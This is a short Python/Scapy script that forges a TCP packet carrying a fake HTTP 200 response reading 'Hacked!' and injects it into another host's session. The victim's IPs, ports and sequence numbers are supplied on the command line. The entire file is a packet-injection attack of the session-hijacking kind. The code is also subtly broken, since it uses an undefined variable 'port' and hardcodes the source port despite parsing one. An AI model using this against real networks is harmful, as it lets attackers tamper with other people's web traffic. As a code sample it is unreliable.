from scapy.all import *
import sys

#mac_src = sys.argv[1]
#mac_dst = sys.argv[2]
ip_src = sys.argv[1]
ip_dst = sys.argv[2]
source_port = int(sys.argv[3])
dst_port = int(sys.argv[4])
seq_num = int(sys.argv[5])
ack_seq_num = int(sys.argv[6])

eth = Ether(dst="00:0C:29:9E:EB:5A", src="00:0C:29:33:AA:35")
ip = IP(src=ip_src, dst=ip_dst, flags="DF")
tcp = TCP(flags="PA", sport=80, dport=port, seq=seq_num, ack=ack_seq_num)
data = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>Hacked!</html>"
frame = eth/ip/tcp/data

sendp(frame)
